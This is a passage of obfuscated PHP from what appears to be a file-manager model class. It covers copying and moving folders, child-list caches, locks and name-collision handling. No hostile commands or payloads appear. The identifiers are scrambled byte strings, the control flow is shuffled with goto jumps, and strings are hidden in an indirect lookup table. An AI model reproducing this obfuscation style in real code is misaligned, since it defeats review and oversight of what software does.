$a¶¯∂Ï·óÆ]); } $AöîÙ™Ê’ô = $this->sourceInfo($a¶¯∂Ï·óÆ); if (!$AöîÙ™Ê’ô) { show_json(LNG($bº°ﬁŒå¶¡[105]), !1); } goto E∑ÖÁ’˜¥; dçàÀ∂ˆôΩ: if (!isset($this->_lockTimeStart[$C‰·»…Ñ≥˘])) { return; } $C¬§Á∑æ—Í = timeFloat() - $this->_lockTimeStart[$C‰·»…Ñ≥˘]; unset($this->_lockTimeStart[$C‰·»…Ñ≥˘]); goto d⁄¿œÑÜ›ú; E∑ÖÁ’˜¥: } private function _lockParent($bêûŸ∂¡Ø‡, $Bíıâı≤‰∑, $aŸî›‰áÚ∆) { if (!$this->autoLockSet) { return; } $A”∂ß·§§ˆ = $this->sourceInfo($bêûŸ∂¡Ø‡); if (!is_array($A”∂ß·§§ˆ)) { return; } $eπ©òµëô˜ = array_reverse($this->parentLevelArray($A”∂ß·§§ˆ[$_SERVER[™⁄»üÆ][503]])); foreach ($eπ©òµëô˜ as $b√–ÉûçÂ) { $this->_lockEvent($b√–ÉûçÂ, $Bíıâı≤‰∑, $aŸî›‰áÚ∆); } } private function _lockEvent($c–„∂¯◊îŸ, $Dü´∑¨Ç∞„, $f≈ £Í‚Ñø) { $Cà§»⁄¶¨® =& $_SERVER[™⁄»üÆ]; if (!$this->autoLockSet) { return; } foreach ($Dü´∑¨Ç∞„ as $BÛ¢˜÷‰Ú›) { $dù¨ã´á˘∆ = $BÛ¢˜÷‰Ú› . $Cà§»⁄¶¨®[95] . $c–„∂¯◊îŸ; if ($f≈ £Í‚Ñø && CacheLock::lockGet($Cà§»⁄¶¨®[542] . $dù¨ã´á˘∆)) { continue; } $this->_lockKey($dù¨ã´á˘∆, $f≈ £Í‚Ñø); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($AäúÏº’Ô‘, $bÒ®Ô´Ñ«ø = 1) { $FˆÏñÂ«îˆ = $_SERVER[™⁄»üÆ][542] . md5($AäúÏº’Ô‘); if ($bÒ®Ô´Ñ«ø) { if (isset(self::$_lockItemArr[$FˆÏñÂ«îˆ])) { return; } self::$_lockItemArr[$FˆÏñÂ«îˆ] = 1; CacheLock::lock($FˆÏñÂ«îˆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$FˆÏñÂ«îˆ])) { return; } unset(self::$_lockItemArr[$FˆÏñÂ«îˆ]); CacheLock::unlock($FˆÏñÂ«îˆ); } } public function isParentOf($DÖ‹úÉ∂ÉÕ, $d ¬óö†ı∫) { goto d–¿ä◊ÜÚª; E≤éà©úÎ: $E‰ÇÀ≥¨ä = $F‚†≈°Ù¶Ù[$D∂ıüÿ—í∆[503]] . $F‚†≈°Ù¶Ù[$D∂ıüÿ—í∆[396]] . $D∂ıüÿ—í∆[47]; $AºñòÑä”… = $D›âµå·õò[$D∂ıüÿ—í∆[503]] . $D›âµå·õò[$D∂ıüÿ—í∆[396]] . $D∂ıüÿ—í∆[47]; $C√ÒÓååŒÕ = strpos($AºñòÑä”…, $E‰ÇÀ≥¨ä) === 0; goto d¢ô¯üÇ§»; d¢ô¯üÇ§»: return $C√ÒÓååŒÕ; goto fœØ⁄€∑Öá; d–¿ä◊ÜÚª: $D∂ıüÿ—í∆ =& $_SERVER[™⁄»üÆ]; $F‚†≈°Ù¶Ù = $this->sourceInfo($DÖ‹úÉ∂ÉÕ); $D›âµå·õò = $this->sourceInfo($d ¬óö†ı∫); goto E≤éà©úÎ; fœØ⁄€∑Öá: } private $targetIsDelete = 0; public function copy($cÿüº°Ü∆«, $e∫†∑ ∫ÜÚ, $bà§Ã∂∫›Ÿ = REPEAT_REPLACE, $C”∏¬≈ÇﬂË = '') { goto b˜ê¿ıﬁÑç; eçè∆Ìè‡Ù: $this->_childrenListClear(); $this->lockCopyEnd($cÿüº°Ü∆«); $this->lockWriteEnd($e∫†∑ ∫ÜÚ, $Bçﬁ¯ô≈ö¥); goto aÛ‚ã›≈“Ù; b˜ê¿ıﬁÑç: $EãáÁôÏ¿´ =& $_SERVER[™⁄»üÆ]; $dÍÔ∫Ü‚Ãî = $this->sourceInfo($cÿüº°Ü∆«); $CÊÏáŒØ≈Ê = $this->sourceInfo($e∫†∑ ∫ÜÚ); goto F¨Çä™“ıá; aÛ‚ã›≈“Ù: if ($dÍÔ∫Ü‚Ãî[$EãáÁôÏ¿´[404]] == $EãáÁôÏ¿´[87] && $e»Ê∑≈ù“∆ == $C‚«√–¿’ô) { $this->folderSizeResetChildren($e»Ê∑≈ù“∆); } Model($EãáÁôÏ¿´[546])->addAll($B±êı⁄™Àõ[$EãáÁôÏ¿´[544]], array(), !0); if ($e»Ê∑≈ù“∆ != $C‚«√–¿’ô || $dÍÔ∫Ü‚Ãî[$EãáÁôÏ¿´[404]] == $EãáÁôÏ¿´[87]) { Model($EãáÁôÏ¿´[547])->eventCopy($C‚«√–¿’ô); } goto aç›øú∂ïï; C†ÓÃÖ‹ÇÑ: $this->lockCopyStart($cÿüº°Ü∆«); $this->lockWriteStart($e∫†∑ ∫ÜÚ, $Bçﬁ¯ô≈ö¥); $B±êı⁄™Àõ = array($EãáÁôÏ¿´[543] => array(), $EãáÁôÏ¿´[544] => array(), $EãáÁôÏ¿´[545] => array()); goto cﬂ∫ê‘≠€˜; cﬂ∫ê‘≠€˜: $this->targetIsDelete = intval($dÍÔ∫Ü‚Ãî[$EãáÁôÏ¿´[424]]); $e»Ê∑≈ù“∆ = $this->fileNameExistCache($e∫†∑ ∫ÜÚ, $dÍÔ∫Ü‚Ãî[$EãáÁôÏ¿´[28]]); $C‚«√–¿’ô = $this->_copy($cÿüº°Ü∆«, $e∫†∑ ∫ÜÚ, $bà§Ã∂∫›Ÿ, $B±êı⁄™Àõ, !0, $C”∏¬≈ÇﬂË); goto eçè∆Ìè‡Ù; aç›øú∂ïï: $this->saveAll($B±êı⁄™Àõ[$EãáÁôÏ¿´[545]]); Model($EãáÁôÏ¿´[193])->linkAdd($B±êı⁄™Àõ[$EãáÁôÏ¿´[543]]); $this->folderSizeReset($e∫†∑ ∫ÜÚ); goto eÑ†ãó≥∂µ; F¨Çä™“ıá: if (!$dÍÔ∫Ü‚Ãî || !$CÊÏáŒØ≈Ê || $CÊÏáŒØ≈Ê[$EãáÁôÏ¿´[404]] != $EãáÁôÏ¿´[87]) { return !1; } if ($this->isParentOf($cÿüº°Ü∆«, $e∫†∑ ∫ÜÚ)) { return !1; } $Bçﬁ¯ô≈ö¥ = $C”∏¬≈ÇﬂË ? $C”∏¬≈ÇﬂË : $dÍÔ∫Ü‚Ãî[$EãáÁôÏ¿´[28]]; goto C†ÓÃÖ‹ÇÑ; eÑ†ãó≥∂µ: $this->updateModifyTime($e∫†∑ ∫ÜÚ); return $C‚«√–¿’ô; goto aáºõ¨“´À; aáºõ¨“´À: } private function _copy($dπ√ıò©√´, $DÚ∞¡≤±ÇÑ, $d¨Í€ã‰Úº, &$dÙπœÌÃûº, $CŒëéäËœ, $DËàÊ¡«âó = '') { goto b¨®‹… ”∏; a©•úßﬁ à: $D¨◊√Ωêõ∞ = $DËàÊ¡«âó ? $DËàÊ¡«âó : $c¢‘Ñ∆‘±á[$f›Ñïƒ¬‡∂[28]]; $BÒå‘ÊÓÆ¶ = $this->fileNameExistCache($DÚ∞¡≤±ÇÑ, $D¨◊√Ωêõ∞); if ($CŒëéäËœ) { $this->_childrenAllMake($dπ√ıò©√´); if ($E∫÷Éùå„‰ && $BÒå‘ÊÓÆ¶) { $this->_childrenAllMake($BÒå‘ÊÓÆ¶); } } goto FÒ§´≥Ì†À; FÒ§´≥Ì†À: if (!$BÒå‘ÊÓÆ¶) { return $this->_copyCreate($dπ√ıò©√´, $DÚ∞¡≤±ÇÑ, $D¨◊√Ωêõ∞, $dÙπœÌÃûº); } $fàﬁû∆è¿Æ = $BÒå‘ÊÓÆ¶; if ($E∫÷Éùå„‰) { if ($d¨Í€ã‰Úº == REPEAT_RENAME_FOLDER) { $D¨◊√Ωêõ∞ = $this->fileNameAutoCache($DÚ∞¡≤±ÇÑ, $D¨◊√Ωêõ∞, $d¨Í€ã‰Úº, $E∫÷Éùå„‰); $fàﬁû∆è¿Æ = $this->_copyCreate($dπ√ıò©√´, $DÚ∞¡≤±ÇÑ, $D¨◊√Ωêõ∞, $dÙπœÌÃûº); } else { $e∂ÚôÈ∂¬´ = $this->_childrenList($dπ√ıò©√´); foreach ($e∂ÚôÈ∂¬´ as $Dê”Œ≠”ÀÚ) { $this->_copy($Dê”Œ≠”ÀÚ[$f›Ñïƒ¬‡∂[396]], $BÒå‘ÊÓÆ¶, $d¨Í€ã‰Úº, $dÙπœÌÃûº, !1); } } } else { if ($d¨Í€ã‰Úº == REPEAT_RENAME || $d¨Í€ã‰Úº == REPEAT_RENAME_FOLDER) { $D¨◊√Ωêõ∞ = $this->fileNameAutoCache($DÚ∞¡≤±ÇÑ, $D¨◊√Ωêõ∞, $d¨Í€ã‰Úº, $E∫÷Éùå„‰); $fàﬁû∆è¿Æ = $this->_copyCreate($dπ√ıò©√´, $DÚ∞¡≤±ÇÑ, $D¨◊√Ωêõ∞, $dÙπœÌÃûº); } else { if ($d¨Í€ã‰Úº == REPEAT_REPLACE) { $d–Ç¬äÙò” = $this->sourceInfoCache($BÒå‘ÊÓÆ¶); $dÊπ∞ò«–Ï = $this->fileHistory($d–Ç¬äÙò”, $c¢‘Ñ∆‘±á[$f›Ñïƒ¬‡∂[448]], $c¢‘Ñ∆‘±á[$f›Ñïƒ¬‡∂[78]]); if ($dÊπ∞ò«–Ï) { $dÙπœÌÃûº[$f›Ñïƒ¬‡∂[543]][] = $c¢‘Ñ∆‘±á[$f›Ñïƒ¬‡∂[448]]; } } else { if ($d¨Í€ã‰Úº == REPEAT_SKIP) { } } } Hook::trigger($f›Ñïƒ¬‡∂[548], array($f›Ñïƒ¬‡∂[549], $c¢‘Ñ∆‘±á, 0)); } goto D¢öö£ÌíË; D¢öö£ÌíË: return $fàﬁû∆è¿Æ; goto e°ﬂ≥†Éµ€; b¨®‹… ”∏: $f›Ñïƒ¬‡∂ =& $_SERVER[™⁄»üÆ]; $c¢‘Ñ∆‘±á = $this->sourceInfoCache($dπ√ıò©√´); $E∫÷Éùå„‰ = $c¢‘Ñ∆‘±á[$f›Ñïƒ¬‡∂[404]] == $f›Ñïƒ¬‡∂[87]; goto a©•úßﬁ à; e°ﬂ≥†Éµ€: } private function _copyCreate($F›îÍôº„Ë, $Bıáô‰˘õ™, $eÑâØ‰ıã€, &$eúµáô®¥Ñ) { goto BËæ⁄¿«ÊÎ; aõÒ‚ò ü•: $this->addAll($B¥É∫Ù‰‰∑, array(), !1); $dÃ»Õ∂îŸç = $this->where(array($eÊ†æé§Ó[479] => $EÿƒËÑàÕÈ))->select(); $FäÓÁﬂïâÔ = $this->_childrenMakeRelation($B“‚µÂ§Œ‡, $dÃ»Õ∂îŸç); goto aá˜ïó€åÕ; bµ±¯ëÕº∫: $this->chunkEventSet($eÊ†æé§Ó[557], array($eÊ†æé§Ó[558], $AËÜ–À⁄πø, $a¶ëÍ’≥ŒÀ)); $this->saveAll($b∫ãı¨”Êã); return $EÿƒËÑàÕÈ; goto bëΩµÇ¶Àé; fÇ‚¬à‹ˆπ: $this->_childrenListAll($F›îÍôº„Ë, $B“‚µÂ§Œ‡); $a¶ëÍ’≥ŒÀ = count($B“‚µÂ§Œ‡); if ($a¶ëÍ’≥ŒÀ == 0) { return $EÿƒËÑàÕÈ; } goto c⁄ÛåÎÜ≥“; B§Ã¶∏¬ Û: if ($cÒ©œû≈Ó∑[$eÊ†æé§Ó[404]] != $eÊ†æé§Ó[87]) { $eúµáô®¥Ñ[$eÊ†æé§Ó[543]][] = $cÒ©œû≈Ó∑[$eÊ†æé§Ó[448]]; return $EÿƒËÑàÕÈ; } $B“‚µÂ§Œ‡ = array(); $B¥É∫Ù‰‰∑ = array(); goto fÇ‚¬à‹ˆπ; DØ«√Ê òù: $EÿƒËÑàÕÈ = $this->add($AËÜ–À⁄πø); $bƒÚè∞±ı¥ = array($eÊ†æé§Ó[396] => $EÿƒËÑàÕÈ, $eÊ†æé§Ó[28] => $eÑâØ‰ıã€); $this->_copyApplyMeta($bƒÚè∞±ı¥, $eúµáô®¥Ñ); goto B§Ã¶∏¬ Û; BËæ⁄¿«ÊÎ: $eÊ†æé§Ó =& $_SERVER[™⁄»üÆ]; $cÒ©œû≈Ó∑ = $this->sourceInfoCache($F›îÍôº„Ë); $FÁﬁˆÎŸπÆ = $this->sourceInfoCache($Bıáô‰˘õ™); goto F£ñ›‘ûŸï; c⁄ÛåÎÜ≥“: $aµÇ«√çÊì = $this->sourceInfo($EÿƒËÑàÕÈ); foreach ($B“‚µÂ§Œ‡ as $Féãπà’Óè) { $bé“ÕÎÉ°â = $this->_makeItemData($Féãπà’Óè, $aµÇ«√çÊì, $Féãπà’Óè[$eÊ†æé§Ó[28]]); $bé“ÕÎÉ°â[$eÊ†æé§Ó[503]] = $Féãπà’Óè[$eÊ†æé§Ó[503]]; $B¥É∫Ù‰‰∑[] = $bé“ÕÎÉ°â; } $this->chunkEventSet($eÊ†æé§Ó[553], array($eÊ†æé§Ó[554], $AËÜ–À⁄πø, $a¶ëÍ’≥ŒÀ)); goto aõÒ‚ò ü•; D˘–ôô°óÁ: foreach ($dÃ»Õ∂îŸç as $Féãπà’Óè) { $aÑ•Ú¡«¬® = $Féãπà’Óè[$eÊ†æé§Ó[396]]; $D∞∏Æñ›œñ = $this->_childrenMatch($FäÓÁﬂïâÔ, $Féãπà’Óè, $aµÇ«√çÊì); $aøÑ∏òçâÍ[] = array($eÊ†æé§Ó[396], $aÑ•Ú¡«¬®, $eÊ†æé§Ó[479], $D∞∏Æñ›œñ[$eÊ†æé§Ó[479]]); $b∫ãı¨”Êã[] = array($eÊ†æé§Ó[396], $aÑ•Ú¡«¬®, $eÊ†æé§Ó[503], $D∞∏Æñ›œñ[$eÊ†æé§Ó[503]]); $this->_copyApplyMeta($Féãπà’Óè, $eúµáô®¥Ñ); if ($Féãπà’Óè[$eÊ†æé§Ó[404]] != $eÊ†æé§Ó[87]) { $eúµáô®¥Ñ[$eÊ†æé§Ó[543]][] = $Féãπà’Óè[$eÊ†æé§Ó[448]]; } } $this->chunkEventSet($eÊ†æé§Ó[555], array($eÊ†æé§Ó[556], $AËÜ–À⁄πø, $a¶ëÍ’≥ŒÀ)); $this->saveAll($aøÑ∏òçâÍ); goto bµ±¯ëÕº∫; aá˜ïó€åÕ: $FäÓÁﬂïâÔ[$F›îÍôº„Ë] = $EÿƒËÑàÕÈ; $aøÑ∏òçâÍ = array(); $b∫ãı¨”Êã = array(); goto D˘–ôô°óÁ; F£ñ›‘ûŸï: $AËÜ–À⁄πø = $this->_makeItemData($cÒ©œû≈Ó∑, $FÁﬁˆÎŸπÆ, $eÑâØ‰ıã€); Hook::trigger($eÊ†æé§Ó[550], $AËÜ–À⁄πø); Hook::trigger($eÊ†æé§Ó[551], array($eÊ†æé§Ó[552], $AËÜ–À⁄πø, 0)); goto DØ«√Ê òù; bëΩµÇ¶Àé: } private function _childrenMakeRelation($b∞Ñê≤‰ Ö, $a≈¨¥⁄ßØ‰) { $A∞ﬁËõ€“Ü =& $_SERVER[™⁄»üÆ]; $Eåãì–Ÿ≠Â = array(); $Bå±∞ÆÃäá = array(); foreach ($b∞Ñê≤‰ Ö as $bƒ÷Òﬁçõ∏) { $d”»Ù∑â—Ñ = $bƒ÷Òﬁçõ∏[$A∞ﬁËõ€“Ü[28]] . $A∞ﬁËõ€“Ü[8] . $bƒ÷Òﬁçõ∏[$A∞ﬁËõ€“Ü[503]]; $Eåãì–Ÿ≠Â[$d”»Ù∑â—Ñ] = $bƒ÷Òﬁçõ∏[$A∞ﬁËõ€“Ü[396]]; } foreach ($a≈¨¥⁄ßØ‰ as $bƒ÷Òﬁçõ∏) { $d”»Ù∑â—Ñ = $bƒ÷Òﬁçõ∏[$A∞ﬁËõ€“Ü[28]] . $A∞ﬁËõ€“Ü[8] . $bƒ÷Òﬁçõ∏[$A∞ﬁËõ€“Ü[503]]; $CÚáØ‚ÔÒæ = $Eåãì–Ÿ≠Â[$d”»Ù∑â—Ñ]; $Bå±∞ÆÃäá[$CÚáØ‚ÔÒæ] = $bƒ÷Òﬁçõ∏[$A∞ﬁËõ€“Ü[396]]; } return $Bå±∞ÆÃäá; } private function _childrenMatch($Bı—§ìê›”, $E†çÉÑäÜÜ, $EŒ∫ª´ó´›) { goto EööøÚ¡˜; F™≤”≤È“ù: foreach ($EÁŸÈû€‹Œ as $eÑ∆Çä≤ãä) { if (isset($Bı—§ìê›”[$eÑ∆Çä≤ãä])) { $BÃæä“‘®ä .= $Bı—§ìê›”[$eÑ∆Çä≤ãä] . $d†‚Õ™ÒÖ•[559]; } } $BÃæä“‘®ä = rtrim($BÃæä“‘®ä, $d†‚Õ™ÒÖ•[47]) . $d†‚Õ™ÒÖ•[47]; $A≈˜ˆ∆◊¥Ÿ = $this->parentLevelArray($BÃæä“‘®ä); goto C∏∞®©≠Ù¿; EööøÚ¡˜: $d†‚Õ™ÒÖ• =& $_SERVER[™⁄»üÆ]; $BÃæä“‘®ä = $EŒ∫ª´ó´›[$d†‚Õ™ÒÖ•[503]]; $EÁŸÈû€‹Œ = $this->parentLevelArray($E†çÉÑäÜÜ[$d†‚Õ™ÒÖ•[503]]); goto F™≤”≤È“ù; C∏∞®©≠Ù¿: $CÍŒêËäø˜ = $A≈˜ˆ∆◊¥Ÿ[count($A≈˜ˆ∆◊¥Ÿ) - 1]; return array($d†‚Õ™ÒÖ•[479] => $CÍŒêËäø˜, $d†‚Õ™ÒÖ•[503] => $BÃæä“‘®ä); goto a∏™ü©Ÿ¨; a∏™ü©Ÿ¨: } private function _makeItemData($f±âåÊ∂™, $eü…™””ü, $fÍ‚©Úœëç) { $aùŒ≥ÛˆËó =& $_SERVER[™⁄»üÆ]; $bÓ≥≥ãúΩç = array($aùŒ≥ÛˆËó[560] => $f±âåÊ∂™[$aùŒ≥ÛˆËó[404]], $aùŒ≥ÛˆËó[414] => $fÍ‚©Úœëç, $aùŒ≥ÛˆËó[561] => $f±âåÊ∂™[$aùŒ≥ÛˆËó[406]], $aùŒ≥ÛˆËó[449] => $f±âåÊ∂™[$aùŒ≥ÛˆËó[448]], $aùŒ≥ÛˆËó[562] => $f±âåÊ∂™[$aùŒ≥ÛˆËó[78]], $aùŒ≥ÛˆËó[563] => $eü…™””ü[$aùŒ≥ÛˆËó[405]], $aùŒ≥ÛˆËó[564] => $eü…™””ü[$aùŒ≥ÛˆËó[485]], $aùŒ≥ÛˆËó[565] => USER_ID, $aùŒ≥ÛˆËó[566] => USER_ID, $aùŒ≥ÛˆËó[395] => $eü…™””ü[$aùŒ≥ÛˆËó[396]], $aùŒ≥ÛˆËó[567] => $eü…™””ü[$aùŒ≥ÛˆËó[503]] . $eü…™””ü[$aùŒ≥ÛˆËó[396]] . $aùŒ≥ÛˆËó[47], $aùŒ≥ÛˆËó[418] => $f±âåÊ∂™[$aùŒ≥ÛˆËó[84]], $aùŒ≥ÛˆËó[423] => 0, $aùŒ≥ÛˆËó[568] => $aùŒ≥ÛˆËó[33]); return $bÓ≥≥ãúΩç; } private function _copyApplyMeta($Fèï⁄çÌÓ˘, &$fÎú⁄Éèﬁ) { $D ÷ÿòá∏’ =& $_SERVER[™⁄»üÆ]; $dÉøÚºå‹˘ = $Fèï⁄çÌÓ˘[$D ÷ÿòá∏’[396]]; $FËãçû‘ú± = $Fèï⁄çÌÓ˘[$D ÷ÿòá∏’[28]]; if (!isset($Fèï⁄çÌÓ˘[$D ÷ÿòá∏’[569]]) || !$Fèï⁄çÌÓ˘[$D ÷ÿòá∏’[569]] || $Fèï⁄çÌÓ˘[$D ÷ÿòá∏’[569]] == $D ÷ÿòá∏’[191]) { $fÎú⁄Éèﬁ[$D ÷ÿòá∏’[545]][] = array($D ÷ÿòá∏’[396], $dÉøÚºå‹˘, $D ÷ÿòá∏’[569], short_id($dÉøÚºå‹˘)); } if (Input::check($FËãçû‘ú±, $D ÷ÿòá∏’[570])) { $fÎú⁄Éèﬁ[$D ÷ÿòá∏’[544]][] = array($D ÷ÿòá∏’[396] => $dÉøÚºå‹˘, $D ÷ÿòá∏’[93] => $D ÷ÿòá∏’[445], $D ÷ÿòá∏’[372] => str_replace($D ÷ÿòá∏’[50], $D ÷ÿòá∏’[33], Pinyin::encode($FËãçû‘ú±))); $fÎú⁄Éèﬁ[$D ÷ÿòá∏’[544]][] = array($D ÷ÿòá∏’[396] => $dÉøÚºå‹˘, $D ÷ÿòá∏’[93] => $D ÷ÿòá∏’[444], $D ÷ÿòá∏’[372] => Pinyin::encode($FËãçû‘ú±, $D ÷ÿòá∏’[571])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($F«µÂØÚ™ø) { goto f£ööíäÀ√; dö≥…‚á Ø: $Eèπ≈ËÊÓÑ = array_to_keyvalue($Eèπ≈ËÊÓÑ, $Aÿ·â⁄⁄∆ﬁ[396]); foreach ($Eèπ≈ËÊÓÑ as $F©Ë·Ü¿ë£) { $e˜¶û∂ÿüø = $F©Ë·Ü¿ë£[$Aÿ·â⁄⁄∆ﬁ[479]]; $F«µÂØÚ™ø = $F©Ë·Ü¿ë£[$Aÿ·â⁄⁄∆ﬁ[396]]; if (!isset($this->_childrenListCache[$F«µÂØÚ™ø]) && $F©Ë·Ü¿ë£[$Aÿ·â⁄⁄∆ﬁ[404]] == $Aÿ·â⁄⁄∆ﬁ[87]) { $this->_childrenListCache[$F«µÂØÚ™ø] = array(); } if (!isset($this->_childrenListCache[$e˜¶û∂ÿüø])) { $this->_childrenListCache[$e˜¶û∂ÿüø] = array(); } $this->_childrenListCache[$e˜¶û∂ÿüø][$F«µÂØÚ™ø] = $F©Ë·Ü¿ë£; $this->_childrenItemCache[$F«µÂØÚ™ø] = $F©Ë·Ü¿ë£; } goto aÆ£Ò¥ü‰‡; f£ööíäÀ√: $Aÿ·â⁄⁄∆ﬁ =& $_SERVER[™⁄»üÆ]; $cá◊ˆ€áªÁ = $this->sourceInfo($F«µÂØÚ™ø); $eòíœâìƒ∑ = $Aÿ·â⁄⁄∆ﬁ[425]; goto aâ™√“∑†›; aâ™√“∑†›: $Aí‘µâ°‰Ç = array($Aÿ·â⁄⁄∆ﬁ[503] => array($Aÿ·â⁄⁄∆ﬁ[526], $cá◊ˆ€áªÁ[$Aÿ·â⁄⁄∆ﬁ[503]] . $F«µÂØÚ™ø . $Aÿ·â⁄⁄∆ﬁ[527]), $Aÿ·â⁄⁄∆ﬁ[424] => $this->targetIsDelete); $Eèπ≈ËÊÓÑ = $this->field($eòíœâìƒ∑)->where($Aí‘µâ°‰Ç)->select(); if (!$Eèπ≈ËÊÓÑ) { return; } goto dö≥…‚á Ø; aÆ£Ò¥ü‰‡: } private function _childrenListAll($aã¨éõˆ◊ß, &$B‡Œ€«Ó‡•) { $f§»Ø∑ÃˆÖ =& $_SERVER[™⁄»üÆ]; if (!isset($this->_childrenListCache[$aã¨éõˆ◊ß])) { return; } $A“» „çÀ≤ = $this->_childrenListCache[$aã¨éõˆ◊ß]; foreach ($A“» „çÀ≤ as $b‡í¶˜◊Úº => $C∞É¿ÕáÇ–) { $B‡Œ€«Ó‡•[$b‡í¶˜◊Úº] = $C∞É¿ÕáÇ–; if ($C∞É¿ÕáÇ–[$f§»Ø∑ÃˆÖ[404]] == $f§»Ø∑ÃˆÖ[87]) { $this->_childrenListAll($b‡í¶˜◊Úº, $B‡Œ€«Ó‡•); } } } private function sourceInfoCache($BÇﬁë•˘‚ˆ) { if (isset($this->_childrenItemCache[$BÇﬁë•˘‚ˆ])) { return $this->_childrenItemCache[$BÇﬁë•˘‚ˆ]; } return $this->sourceInfo($BÇﬁë•˘‚ˆ); } private function _childrenList($fÕ∑ŒÓ‚›ë) { if (isset($this->_childrenListCache[$fÕ∑ŒÓ‚›ë])) { return $this->_childrenListCache[$fÕ∑ŒÓ‚›ë]; } return $this->_childrenListSelect($fÕ∑ŒÓ‚›ë); } private function _childrenListSelect($DÕ¢óïâµ‘) { goto aº¬èÿ÷åö; aº¬èÿ÷åö: $Fë“ÏÍ‰Üâ =& $_SERVER[™⁄»üÆ]; $dΩæÍ›Ìè∞ = array($Fë“ÏÍ‰Üâ[479] => $DÕ¢óïâµ‘, $Fë“ÏÍ‰Üâ[424] => $this->targetIsDelete); $EÌ◊ÂÑàåé = $this->where($dΩæÍ›Ìè∞)->select(); goto eöÃÇ‰‡πÜ; f∆àé‘±é: foreach ($Fæ∂∑†Î¨å as $DÕ¢óïâµ‘ => $E≥ã√ËùàÒ) { $this->_childrenItemCache[$DÕ¢óïâµ‘] = $E≥ã√ËùàÒ; } return $Fæ∂∑†Î¨å; goto C—ïı€ˆÀ; eöÃÇ‰‡πÜ: $EÌ◊ÂÑàåé = $EÌ◊ÂÑàåé ? $EÌ◊ÂÑàåé : array(); $Fæ∂∑†Î¨å = array_to_keyvalue($EÌ◊ÂÑàåé, $Fë“ÏÍ‰Üâ[396]); $this->_childrenListCache[$DÕ¢óïâµ‘] = $Fæ∂∑†Î¨å; goto f∆àé‘±é; C—ïı€ˆÀ: } private function fileNameExistCache($fÉŒï˘÷…Ô, $AúÈÕúπ‚») { $Fâÿå◊∑ıÖ =& $_SERVER[™⁄»üÆ]; $AúÈÕúπ‚» = strtolower($AúÈÕúπ‚»); $CçÌ’ÓÑ™Ü = $this->_childrenList($fÉŒï˘÷…Ô); foreach ($CçÌ’ÓÑ™Ü as $f‚ ïÆÆ‘Ù) { if ($AúÈÕúπ‚» == strtolower($f‚ ïÆÆ‘Ù[$Fâÿå◊∑ıÖ[28]])) { return $f‚ ïÆÆ‘Ù[$Fâÿå◊∑ıÖ[396]]; } } return !1; } private function fileNameAutoCache($Cƒ∂»õÁöÚ, $eòÓÒ’«≠ê, $d£€ˆ⁄èó˜, $f…ˆÊ¡Ñµı) { $f≤ôÆﬂı‡¨ =& $_SERVER[™⁄»üÆ]; $CÚÑá»ñ£√ = $this->_childrenList($Cƒ∂»õÁöÚ); $aÇµ—Ω‘‹‘ = array_to_keyvalue($CÚÑá»ñ£√, $f≤ôÆﬂı‡¨[33], $f≤ôÆﬂı‡¨[28]); return $this->fileNameAutoGet($aÇµ—Ω‘‹‘, $eòÓÒ’«≠ê, $d£€ˆ⁄èó˜, $f…ˆÊ¡Ñµı); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($càÎ∆ÃñêÑ, $CáŒ–ÈÔÚ∂, $fëÇ™√ª∂â = REPEAT_REPLACE, $Cÿ„ª«Ò–ú = '') { goto Fπ•‚¥Ãú§; cë¶©ÓÉ∑Î: $f÷¥Á√Ÿô≤ = $this->fileNameExistCache($CáŒ–ÈÔÚ∂, $c¡®∏êç°é[$EÆﬂ∂»‡Ãá[28]]); $dÃ”—–§ŒÔ = $this->_move($càÎ∆ÃñêÑ, $CáŒ–ÈÔÚ∂, $fëÇ™√ª∂â, $f”√˘ãê∆≥, $Cÿ„ª«Ò–ú); $this->sourceCacheClear(); goto d èëØ¿íœ; FΩ‡¶úæ°å: return $dÃ”—–§ŒÔ; goto D¬áíœ¢…˜; Bîº†÷‡Ìì: $this->lockMoveEnd($càÎ∆ÃñêÑ); $this->lockWriteEnd($CáŒ–ÈÔÚ∂, $BÊÇ•«êÜè); $this->folderSizeReset($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[479]]); goto A≤Éê∞ñ◊é; d èëØ¿íœ: if ($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[404]] == $EÆﬂ∂»‡Ãá[87] && $f÷¥Á√Ÿô≤) { $this->folderSizeResetChildren($dÃ”—–§ŒÔ); } Model($EÆﬂ∂»‡Ãá[193])->linkAdd($f”√˘ãê∆≥[$EÆﬂ∂»‡Ãá[543]]); if ($f÷¥Á√Ÿô≤ && $f”√˘ãê∆≥[$EÆﬂ∂»‡Ãá[574]]) { $this->removeNow($càÎ∆ÃñêÑ, !1); } goto Bîº†÷‡Ìì; Fô•Ó∑∞¨„: if ($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[479]] == $CáŒ–ÈÔÚ∂ && $Cÿ„ª«Ò–ú != $c¡®∏êç°é[$EÆﬂ∂»‡Ãá[28]]) { $c‰úéÁ˘¿µ = $this->fileNameExist($CáŒ–ÈÔÚ∂, $Cÿ„ª«Ò–ú); if ($c‰úéÁ˘¿µ && $c¡®∏êç°é[$EÆﬂ∂»‡Ãá[404]] == $EÆﬂ∂»‡Ãá[191]) { goto BàíÉõª≥€; E—àÏêÖ∫ß: $this->removeNow($càÎ∆ÃñêÑ, !1); $this->folderSizeReset($CáŒ–ÈÔÚ∂); Hook::trigger($EÆﬂ∂»‡Ãá[573], $e∆∫÷Âì“˜); goto d∑ÀÉæïì¡; BàíÉõª≥€: $E®¿óŒæé‘ = $this->sourceInfo($c‰úéÁ˘¿µ); $aù—äåôÕπ = $this->fileHistory($E®¿óŒæé‘, $c¡®∏êç°é[$EÆﬂ∂»‡Ãá[448]], $c¡®∏êç°é[$EÆﬂ∂»‡Ãá[78]]); if (!$aù—äåôÕπ) { Model($EÆﬂ∂»‡Ãá[451])->remove($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[448]]); } goto E—àÏêÖ∫ß; d∑ÀÉæïì¡: return $c‰úéÁ˘¿µ; goto d∆å”∞§äˆ; d∆å”∞§äˆ: } } $BÊÇ•«êÜè = $Cÿ„ª«Ò–ú ? $Cÿ„ª«Ò–ú : 